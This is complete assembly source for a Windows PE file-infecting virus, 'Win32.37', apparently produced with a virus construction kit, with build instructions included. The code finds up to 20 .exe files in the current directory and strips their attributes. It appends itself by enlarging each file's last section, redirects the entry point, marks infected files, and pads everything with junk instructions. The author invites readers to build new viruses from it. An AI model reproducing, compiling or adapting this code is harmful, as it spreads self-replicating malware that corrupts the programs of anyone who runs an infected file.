              
;
;
; Win32.37 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.37
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 37
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 30
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 add esp, 4d
 mov eax, dword ptr [esp-4]
                                        ; mov ebp, eax
 push eax
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov ecx, ebp
 adc dword ptr [ebp+Trash1], 1583122    ; Trash
 add ecx, offset WFD_nFileSizeLow

 cmp dword ptr [ecx], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea edi, [ebp+WFD_szFileName]
 xchg edi, edx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov edx, 128
 mov edx, 128d
 push edx
 lea ecx, [ebp+WFD_szFileName]
 xchg eax, ecx


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ecx, word ptr [edi]
 cmp ecx, 'ZM'
 je Goodfile
                                        ; mov ebx, 57567
 mov ebx, 0
 add ebx, 57567d
 or ebx, ebx
 jnz Notagoodfile
Goodfile:
 sub eax, eax                           ; Trash
 cmp word ptr [edi+3Ch], 0h
 je Notagoodfile
                                        ; clear edx
 mov edx, -47755d
 add edx, 47755d
 add edx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, edi
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [edx]
 sub ebx, 'EP'
 jz Goodfile2
                                        ; clear ebx
 push 0
 pop ebx
 test ebx, ebx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '37'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, ecx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 sar ebx, 3d                            ; Trash

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], edx

 mov edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edx

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edi, [ebp+filemask]
 xchg edi, ecx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
 and edx, ecx                           ; Trash
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 sub ebx, 91449408d                     ; Trash


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ecx, [ebx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get OTableVA
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 rcl edx, 9d                            ; Trash


 push dword ptr [ebp+NTableVA]
 pop ebx


SearchNextApi1:                         ; search for the API's
 push ebx
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
                                        ; mov ebx, ecx
                                        ; clear ebx
 and ebx, 0
 add ebx, ecx
                                        ; mov esi, ecx
                                        ; clear esi
 mov esi, 57665d
 sub esi, 57665d
 add esi, ecx
 mov dword ptr [ebp+TempApisearch1], eax
 mov edx, edx                           ; Trash
 mov dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov cl, byte ptr [esi]
 cmp cl, byte ptr [edi]
 jne ApiNotFound
 dec eax
 cmp eax, 0
 je FoundApi1
                                        ; add edi, 1
 sub edi, -1d
                                        ; add esi, 1
 add esi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov edi, dword ptr [ebp+TempApisearch3]
 push dword ptr [ebp+TempApisearch1]
 pop eax
 push dword ptr [ebp+TempApisearch2]
 add dword ptr [ebp+Trash1], edx        ; Trash
 pop esi
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, esi
 movzx edx, word ptr [esi]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 Trash2      dd 0h
 OldEIP      dd 0h
 FileHandle  dd 0h
 TempApisearch1 dd 0h
 AlignReg2   dd 0h
 db 'Win32.37 created by SnakeByte',0
 TempApisearch2 dd 0h
 TempAPI     dd 0h
 MapAddress  dd 0h
 ATableVA    dd 0h
 counter     dw 0h
 AlignReg1   dd 0h
 InfCounter  dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XUnmapViewOfFile       dd 0h

 NTableVA    dd 0h
 OTableVA    dd 0h
 NewSize     dd 0h
 KernelMZ    dd 0h
 TempApisearch3 dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OldBase     dd 400000h
 KernelPE    dd 0h
 Trash1      dd 0h
 FindHandle  dd 0h
 MapHandle   dd 0h
 Attributes  dd 0h

 APINames:
 db 11d, 'CloseHandle'
 db 11d, 'CreateFileA'
 db 13d, 'MapViewOfFile'
 db 09d, 'FindClose'
 db 18d, 'SetFileAttributesA'
 db 18d, 'GetFileAttributesA'
 db 14d, 'FindFirstFileA'
 db 18d, 'CreateFileMappingA'
 db 13d, 'FindNextFileA'
 db 15d, 'UnmapViewOfFile'

 filemask    db '*.ExE',0
 NewEIP      dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 mov edi, ebp
 add edi, offset WFD_szFileName

 push edi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 mov ecx, 0
 push ecx
 push ebx
 push ecx
 push 00000004h
 add dword ptr [ebp+Trash1], ebx        ; Trash
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
                                        ; clear eax
 xor eax, eax
 push ebx
 push eax
 push eax
                                        ; mov ecx, 2
 mov ecx, 2d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret
 rol edx, 29d                           ; Trash

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]

 push edx
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov eax, offset WFD_szFileName
 add eax, ebp

                                        ; mov ebx, 276
 mov ebx, 276d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 sub eax, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret
 rcl edx, 17d                           ; Trash

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edi, offset WIN32_FIND_DATA
 add edi, ebp

 push edi
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov esi, dword ptr [esp]
                                        ; round to pages
 shr esi, 16d
 shl esi, 16d
                                        ; add esi, 1
 add esi, 1d
GetKernelLoop:
                                        ; clear ebx
 sub ebx, ebx
 sub esi, 1
 mov bx, word ptr [esi+03ch]
 cmp bx,0f800h
 je GetKernelLoop
 cmp esi, dword ptr [esi+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], esi
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov ecx, [esi]
 dec esi
 sub esi, 59d
 add ecx, esi
 mov [KernelPE+ebp], ecx

 lea ecx, GetApis
 add ecx, ebp

 push ecx
ret


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, 9526d
 sub esi, 9526d
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

                                        ; clear edi
 sub edi, edi
 add edi, dword ptr [ebp+OldBase]

 not eax                                ; Trash
 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 jmp eax



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [eax+3Ch]
 add esi, eax
                                        ; get File Alignment
 mov edx, [esi+3Ch]
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; mov ebx, -1
 mov ebx, ( -1d + 5d )
 sub ebx, 5d
 and ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 mov eax, 47140363d                     ; Trash
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov eax, esi
 add eax, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 push 0
 pop esi
 add esi, eax
                                        ; get last section
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [esi+06h]
 sub ecx, 1
 imul ecx, ecx, 28h
                                        ; add eax, 120
 dec eax
 add eax, 121d
 add eax, ecx
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [esi+74h]
 shl ecx, 3
 add eax, ecx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], edx
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
                                        ; clear ebx
 mov ebx, -965d
 add ebx, 965d

 add ebx, [eax+10h]
                                        ; mov edx, ebx
 push ebx
 pop edx
 adc ecx, 49242711d                     ; Trash
 add ebx, [eax+14h]
 push ebx
 mov ecx, edx
 add ecx, [eax+0Ch]
 push ecx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; clear ecx
 mov ecx, -56709d
 add ecx, 56709d

 add ecx, [eax+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [eax+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], ecx
 mov ecx, dword ptr [eax+10h]
 add ecx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '37'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize
 lea eax, [ebp+Virus]
 xchg esi, eax


AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg eax, edx

 lea edi, [ebp+APINames]


GetApisLoop: 

                                        ; clear eax
 mov eax, 20694d
 sub eax, 20694d
 mov al, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d

                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; edi points to the Name
                                        ; edx points to the offset

 call SearchAPI1
 push edi
 add dword ptr [esp], eax
 pop edi
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], -1
 and dword ptr [edx], ebx
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub ecx, 1
 jnz GetApisLoop
 jmp Outbreak



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 mov eax, 0
 push eax
 call ExitProcess



end FakeCode

